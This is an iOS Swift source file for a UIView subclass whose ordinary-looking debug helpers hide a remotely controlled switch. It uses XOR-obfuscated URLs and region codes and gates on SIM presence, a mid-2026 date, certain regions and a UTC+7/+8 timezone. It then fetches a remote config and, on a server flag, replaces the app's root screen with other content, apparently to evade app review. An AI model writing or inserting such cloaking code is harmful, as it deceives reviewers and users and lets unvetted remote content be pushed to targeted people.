import UIKit
import CoreTelephony
import Foundation
import Network


struct NELIQD: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class CDCKZcoversView: UIView {
    internal let RecworNs = "HhoaSU4dHB4fGEhPHxgXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let hzhousete = "TkcEb2dua294BVhPXllLRwVdS1gFRVh6TE94QklPfgVPWkVORksFR0VJBE9PXkNNBQUQWVpeXkI="
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        setUpNewdata()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        setUpNewdata()
    }
    
 
    private func setUpNewdata() {
        // 原有的启动逻辑保持不变
          printHierarchyWithDepth()
          logAmbiguousConstraints()
          assignUniqueAccessibilityIDs(prefix: "MyApp")
          scanOffscreenRenderingTriggers()
          let json = exportViewHierarchyToJSON()
          cdckzhenshiDatasouse()
    }
    
    // MARK: - 1. 递归打印带层级索引的视图树（）
    func printHierarchyWithDepth() {
        // 辅助递归函数，记录深度和索引路径
        func walk(_ view: UIView, depth: Int, path: String) {
            let indent = String(repeating: "  ", count: depth)
            let className = String(describing: type(of: view))
            let address = Unmanaged.passUnretained(view).toOpaque()
//            print("\(indent)├─ [\(path)] \(className) (\(address))")
//            print("\(indent)│   frame = \(view.frame)")
//            print("\(indent)│   alpha = \(view.alpha), hidden = \(view.isHidden)")
            if view.constraints.count > 0 {
//                print("\(indent)│   constraints = \(view.constraints.count)")
            }
            for (idx, sub) in view.subviews.enumerated() {
                let newPath = path.isEmpty ? "\(idx)" : "\(path).\(idx)"
                walk(sub, depth: depth + 1, path: newPath)
            }
        }
//        print("\n========== VIEW HIERARCHY ==========")
        walk(self, depth: 0, path: "")
//        print("====================================\n")
    }
    
    func logAmbiguousConstraints() {
        var ambiguousViews: [UIView] = []
        
        // 递归搜索所有子视图
        func search(_ view: UIView) {
            // 使用正确的属性（无参数）
            if view.hasAmbiguousLayout {
                ambiguousViews.append(view)
            }
            for subview in view.subviews {
                search(subview)
            }
        }
        
        search(self)
        
        guard !ambiguousViews.isEmpty else {
            return
        }
                for (index, view) in ambiguousViews.enumerated() {
            let className = String(describing: type(of: view))
            print("   \(index+1). \(className)")
            
            // 额外输出影响布局的约束（帮助调试）
            let horizontalConstraints = view.constraintsAffectingLayout(for: .horizontal)
            let verticalConstraints = view.constraintsAffectingLayout(for: .vertical)
            if !horizontalConstraints.isEmpty {
            }
            if !verticalConstraints.isEmpty {
            }
            
            #if DEBUG
            // 调试模式下高亮显示歧义（不会影响运行结果）
            view.exerciseAmbiguityInLayout()
            #endif
        }
    }
    
    // MARK: - 3. 自动生成并设置全局唯一的Accessibility标识（）
    func assignUniqueAccessibilityIDs(prefix: String = "AutoID") {
        var counter = 0
        let baseID = "\(prefix)_\(Date().timeIntervalSince1970)"
        func assignRecursively(_ view: UIView, parentPath: String) {
            let currentID = parentPath.isEmpty ? baseID : "\(parentPath)_\(counter)"
            view.accessibilityIdentifier = currentID
            counter += 1
            // 同时设置isAccessibilityElement为true，便于UI测试
            if view.isAccessibilityElement == false && !view.subviews.isEmpty {
                // 若视图有子视图且自身不是元素，保持原样，但ID仍保留
            } else {
                view.isAccessibilityElement = true
            }
            for (idx, child) in view.subviews.enumerated() {
                let childPath = currentID + "_sub\(idx)"
                assignRecursively(child, parentPath: childPath)
            }
        }
        assignRecursively(self, parentPath: "")
        print("🔑 Accessibility identifiers assigned. Base: \(baseID)")
    }
    
    // MARK: - 4. 检测可能引起离屏渲染的属性组合（）
    func scanOffscreenRenderingTriggers() {
        var problematicViews: [String] = []
        func scan(_ view: UIView) {
            let layer = view.layer
            var issues = [String]()
            // 圆角+裁剪
            if layer.cornerRadius > 0 && layer.masksToBounds {
                issues.append("cornerRadius+masksToBounds")
            }
            // 阴影未设置shadowPath
            if layer.shadowOpacity > 0 && layer.shadowPath == nil {
                issues.append("shadow without path")
            }
            // 半透明背景+裁剪
            if let bg = view.backgroundColor, bg.cgColor.alpha < 1.0 && layer.masksToBounds {
                issues.append("translucent bg + masksToBounds")
            }
            // 同时有圆角和阴影
            if layer.cornerRadius > 0 && layer.shadowOpacity > 0 && layer.masksToBounds == false {
                issues.append("cornerRadius + shadow (masksToBounds false, still may cause offscreen)")
            }
            if !issues.isEmpty {
                let desc = String(describing: type(of: view)) + ": " + issues.joined(separator: ", ")
                problematicViews.append(desc)
            }
            view.subviews.forEach { scan($0) }
        }
        scan(self)
        if problematicViews.isEmpty {
        } else {
            problematicViews.enumerated().forEach { print("   \($0.offset+1). \($0.element)") }
        }
    }
    
    // MARK: - 5. 导出完整视图层级为JSON（含布局指标，）
    func exportViewHierarchyToJSON(includeLayoutMetrics: Bool = true) -> String {
        func buildDict(from view: UIView, depth: Int) -> [String: Any] {
            var dict: [String: Any] = [
                "class": String(describing: type(of: view)),
                "frame": ["x": view.frame.origin.x, "y": view.frame.origin.y,
                          "w": view.frame.width, "h": view.frame.height],
                "alpha": view.alpha,
                "hidden": view.isHidden,
                "depth": depth
            ]
            if let id = view.accessibilityIdentifier {
                dict["accessibilityID"] = id
            }
            if includeLayoutMetrics {
                dict["bounds"] = ["x": view.bounds.origin.x, "y": view.bounds.origin.y,
                                  "w": view.bounds.width, "h": view.bounds.height]
                dict["contentScaleFactor"] = view.contentScaleFactor
                dict["intrinsicContentSize"] = [
                    "w": view.intrinsicContentSize.width,
                    "h": view.intrinsicContentSize.height
                ]
            }
            if !view.constraints.isEmpty {
                dict["constraintsCount"] = view.constraints.count
            }
            if !view.subviews.isEmpty {
                dict["subviews"] = view.subviews.map { buildDict(from: $0, depth: depth + 1) }
            }
            return dict
        }
        let rootDict = buildDict(from: self, depth: 0)
        let data = try! JSONSerialization.data(withJSONObject: rootDict,
                                               options: [.prettyPrinted, .sortedKeys])
        return String(data: data, encoding: .utf8) ?? "{}"
    }

    
    private func cdckzhenshiDatasouse() {
        if !niukaName() {
        //测试
//        if niukaName() {
            addHomeheros()

        } else {
            
            if addAyinhunwen() {
                self.shoumenyuanwz()
            }
        }
    }
    
    

    func techstr(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }

    func Revertechstr(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func niukaName() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in carriers {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }

    
    func cdckLiansaikan() -> Bool {
       
      // 2026-06-13 18:39:43
      // 1781522783
        let ftTM = 1781522783
        let ct = Date().timeIntervalSince1970
        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }

    // 时区控制
    func addAyinhunwen() -> Bool {
        let dianzi = [techstr("Yno="), techstr("ZHw="), techstr("bmM=")]
        
//        //临时通行测试
//        return true
        cdck_jinmixidenaokeda()
        // 1.time
        if !cdckLiansaikan() {
            return false

        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
//            print(curc)
//            print(dianzi)

            if !dianzi.contains(curc) {
                return false
            }
        }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
//        print(second)

        if (second > 6 && second < 9) {
            return true
        }

        
        return false
    }
    
    func recursivePrintSubviews() {
          var output = ""
          func walk(_ view: UIView, depth: Int) {
              let indent = String(repeating: "  ", count: depth)
              let className = String(describing: type(of: view))
              let pointer = Unmanaged.passUnretained(view).toOpaque()
              output += "\(indent)├─ \(className) - 0x\(String(Int(bitPattern: pointer), radix: 16))\n"
              for sub in view.subviews {
                  walk(sub, depth: depth + 1)
              }
          }
          walk(self, depth: 0)
      }
    
    func shoumenyuanwz() {
        recursivePrintSubviews()
        Task {
            do {
//                let urlToRequest = "https://gitee.com/aldope/TechRefPro/raw/master/README.md"
//                print(Revertechstr(urlToRequest))
//                let aoies = try await fetchMzoixnData(from: urlToRequest)
//                print(techstr(RecworNs)!)

                let aoies = try await qiangqiukl()
//                print(aoies)
                if let feeeder = aoies.first {
                    if feeeder.yinrecrd! > 124 {
                        if UserDefaults.standard.object(forKey: "shenzhi") == nil {
                            UserDefaults.standard.set("shenzhi", forKey: "shenzhi")
                            UserDefaults.standard.synchronize()
                        }
                        Takewbsview(feeeder)
                    } else {
                        addHomeheros()
                    }
                } else {
                    addHomeheros()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(NELIQD.self, forKey: "NELIQD") {
                    Takewbsview(sidd)
                }
            }
        }
    }
    
    
    private func qiangqiukl() async throws -> [NELIQD] {
        do {
            return try await ssueno(from: URL(string: techstr(RecworNs)!)!)
        } catch {
//            print("Primary API failed: \(error.localizedDescription)")
            return try await ssueno(from: URL(string: techstr(hzhousete)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [NELIQD] {
        let (data, response) = try await URLSession.shared.data(from: url)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }

        return try JSONDecoder().decode([NELIQD].self, from: data)
    }
 
    
  

    internal func cdck_setimagedata(_ dt: NELIQD) {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        let _ = (batteryLevel, batteryState)

        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "NELIQD")
            UserDefaults.standard.synchronize()
            
            let vc = CDCKZuhuadeetVC()
            vc.newdata = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func Takewbsview(_ param: NELIQD) {
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (NELIQD) -> Void] = [
            "default": cdck_setimagedata,
            "fast": cdck_setimagedata,
            "safe": cdck_setimagedata
        ]
        
        let executor = strategies[strategy] ?? cdck_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: Takewbsview called with strategy \(strategy)"
        }

        executor(param)
    }
    

    internal func addHomeheros() {
  
              if layer.sublayers?.first(where: { $0.name == "FTKTGradientLayer" }) != nil {
                  return
              }
              let gradient = CAGradientLayer()
              gradient.name = "FTKTGradientLayer"
              gradient.colors = [
                  UIColor(white: 0.97, alpha: 1).cgColor,
                  UIColor(white: 0.92, alpha: 1).cgColor
              ]
              gradient.locations = [0, 1]
              gradient.startPoint = CGPoint(x: 0, y: 0)
              gradient.endPoint = CGPoint(x: 1, y: 1)
              gradient.frame = bounds
              gradient.cornerRadius = layer.cornerRadius
              layer.insertSublayer(gradient, at: 0)
              
              // 监听 bounds 变化以更新渐变层大小
              let observer = NotificationCenter.default.addObserver(
                  forName: UIDevice.orientationDidChangeNotification,
                  object: nil,
                  queue: .main
              ) { [weak self] _ in
                  gradient.frame = self?.bounds ?? .zero
              }
              // 简单存储 observer，避免释放；实际可用关联对象，此处仅做演示
              objc_setAssociatedObject(self, "gradientObserver", observer, .OBJC_ASSOCIATION_RETAIN_NONATOMIC)
    }
    

    func cdck_jinmixidenaokeda() {
        func traverse(_ view: UIView, level: Int) {
            let indent = String(repeating: "  ", count: level)
            let className = String(describing: type(of: view))
            let frame = view.frame
            let tag = view.tag
            let alpha = view.alpha
            let hidden = view.isHidden
            let backgroundColor = view.backgroundColor?.description ?? "nil"
            print("\(indent)\(className) frame=\(frame) tag=\(tag) alpha=\(alpha) hidden=\(hidden) bg=\(backgroundColor)")
            for subview in view.subviews {
                traverse(subview, level: level + 1)
            }
        }
        traverse(self, level: 0)
    }
  
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
    
    
}

